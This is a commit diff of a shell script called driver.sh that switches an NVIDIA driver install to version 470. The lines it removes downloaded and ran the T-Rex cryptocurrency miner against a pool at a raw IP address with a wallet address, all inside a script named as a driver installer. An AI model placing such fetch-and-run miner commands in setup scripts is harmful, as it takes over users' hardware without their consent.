1669fbb1cd67572651a62d5c24ea724c7e7a0ca4
anhacvai11 <90373481+anhacvai11@users.noreply.github.com>
2024-10-31 15:49:28 +0700

    Update driver.sh

--- driver.sh
+++ driver.sh
@@ -1,10 +1,9 @@
-/bin/bash
-sudo apt update && sudo apt upgrade -y
-sudo apt autoremove nvidia* --purge
-sudo apt install ubuntu-drivers-common -y
-sudo ubuntu-drivers autoinstall
-sudo apt install nvidia-driver-535
+#!/bin/bash
 
+sudo apt update -y
+sudo apt upgrade -y
+sudo apt install nvidia-driver-470 -y
 
-wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz ; tar xvzf t-rex-0.26.8-linux.tar.gz ; ./t-rex -a kawpow -o stratum+tcp://46.101.160.28:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.compyny
-done
+# Verify installation
+nvidia-smi
+
